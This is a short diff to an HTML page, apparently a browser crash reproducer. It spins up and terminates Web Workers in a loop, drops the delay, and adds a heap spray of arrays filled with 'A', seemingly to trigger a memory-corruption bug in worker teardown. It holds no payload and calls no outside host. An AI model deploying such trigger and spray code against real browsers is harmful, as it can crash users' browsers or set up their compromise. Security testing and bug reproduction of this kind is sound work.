@@ -2,22 +2,22 @@
 <html>
 <head>
     <script>
-        function delay(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
         async function trigger() {
             let workerUrl = "./worker.js";
-            for (let i = 0; i < 50; i++) {
+            let spray = [];
+            for (let i = 0; i < 100; i++) {
                 try {
                     let worker = new Worker(workerUrl);
                     worker.postMessage("test");
                     worker.onmessage = () => {};
-                    await delay(10);
                     worker.terminate();
+                    let payload = new Array(512).fill("A");
+                    spray.push(payload);
                 } catch (e) {}
-                let largeObject = new Array(750000).fill(0);
+                let largeObject = new Array(500000).fill(0);
                 largeObject = null;
             }
+            spray = null;
         }
     </script>
 </head>
